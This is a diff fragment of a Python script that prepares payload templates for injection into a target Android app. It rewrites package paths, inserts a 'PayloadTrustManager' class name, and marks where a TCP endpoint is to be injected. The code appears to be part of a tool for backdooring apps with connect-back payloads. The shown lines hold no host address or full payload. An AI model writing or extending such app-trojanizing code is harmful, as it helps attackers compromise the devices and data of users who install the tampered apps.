@@ -114,8 +114,13 @@ def readPayloads():
 
 		inject="L"+activityToTarget.replace('.','/')
 		intPackagePos=inject.rfind('/')
+		
+		moo=inject[:intPackagePos]
+		packageNewName =moo.replace('/','.').replace('L','')
+		finalPackageNewName=packageNewName+".PayloadTrustManager"
+		
 		preppedContents1= contentsOfFile1.replace('PLACEHOLDER',inject[:intPackagePos])
-		preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos])
+		preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos]).replace('OILYOLO',finalPackageNewName)
 		preppedContents3= contentsOfFile3.replace('PLACEHOLDER',inject[:intPackagePos])
 
 		#inject the tcp endpoint here
